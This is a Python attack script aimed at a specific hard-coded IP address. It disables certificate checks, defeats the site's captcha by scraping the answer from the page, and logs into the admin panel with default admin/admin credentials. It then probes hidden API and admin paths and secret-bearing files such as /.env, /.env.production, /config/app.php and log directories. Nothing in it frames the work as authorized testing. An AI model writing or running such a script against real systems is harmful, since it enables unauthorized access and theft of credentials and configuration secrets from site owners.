#!/usr/bin/env python3
"""
Search for hidden API documentation and configuration files
"""

import requests
import re
import os

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login first
r = sess.get(TARGET + "/admin/login")
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if captcha_match:
        captcha = captcha_match.group(1)
        r = sess.post(TARGET + "/admin/login", data={
            'username': 'admin',
            'password': 'admin',
            'captcha': captcha,
            '_token': token
        })

# Common API documentation paths
docs_paths = [
    "/docs", "/api/docs", "/api/documentation", "/swagger", "/api/swagger",
    "/api/v1/docs", "/api/v2/docs", "/documentation", "/api/doc",
    "/help", "/api/help", "/info", "/api/info", "/README",
    "/v1/docs", "/v2/docs", "/rest/docs", "/api/reference"
]

# Config files that might expose endpoints
config_files = [
    "/config", "/config.json", "/config.yaml", "/config.yml",
    "/.env", "/.env.local", "/.env.production",
    "/public/config", "/app/config", "/config/app.php",
    "/storage/logs", "/logs", "/debug", "/debug.txt"
]

# API version paths
api_versions = [
    "/api/v1", "/api/v2", "/api/v3", "/api/latest",
    "/api/public", "/api/internal", "/api/admin",
    "/public/api", "/internal/api", "/admin/api"
]

print("=== Checking API Documentation Paths ===")
for path in docs_paths:
    try:
        r = sess.get(TARGET + path, timeout=5)
        if r.status_code == 200 and 'index.html' not in r.text[:200]:
            print(f"[200] {path} - Possible API docs")
            # Check if it contains API info
            if 'endpoint' in r.text.lower() or 'api' in r.text.lower():
                print(f"  -> Contains API content")
    except Exception as e:
        pass

print("\n=== Checking Configuration Files ===")
for path in config_files:
    try:
        r = sess.get(TARGET + path, timeout=5)
        if r.status_code == 200:
            print(f"[200] {path}")
            print(f"  -> {len(r.text)} bytes")
            if r.text.strip() and '<!DOCTYPE' not in r.text[:100]:
                print(f"  -> Possible config file content")
    except Exception as e:
        pass

print("\n=== Checking API Version Paths ===")
for path in api_versions:
    try:
        r = sess.get(TARGET + path, timeout=5)
        print(f"{path}: {r.status_code} ({len(r.text)} bytes)")
    except Exception as e:
        pass